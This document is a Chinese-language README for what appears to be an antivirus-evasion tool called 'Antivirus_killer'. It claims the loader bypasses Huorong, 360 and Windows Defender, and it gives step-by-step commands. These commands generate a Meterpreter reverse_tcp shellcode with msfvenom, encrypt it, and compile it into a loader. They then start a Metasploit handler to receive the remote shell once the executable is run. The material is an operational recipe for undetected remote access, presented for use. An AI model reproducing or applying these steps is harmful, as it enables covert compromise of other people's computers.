# Antivirus_killer
免杀主流防病毒软件
测试与2024年8月30日加载器动态免杀增强版可过最新版火绒、360核晶模式、windows自带杀软
# 使用方法
## 生成shellcode
msfvenom LHOST=x.x.x.x LPORT=443 -p windows/x64/meterpreter/reverse_tcp -f c
## 加密shellcode 
将生成的shellcode复制到加密器.c的buf变量中并编译运行
## 编译加载器
将加密后的shellcode 复制到加载器的shellcode变量中编译
## 准备msf监听器
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST x.x.x.x
set LPORT 443
run
## 双击编译好的exe观察是否上线
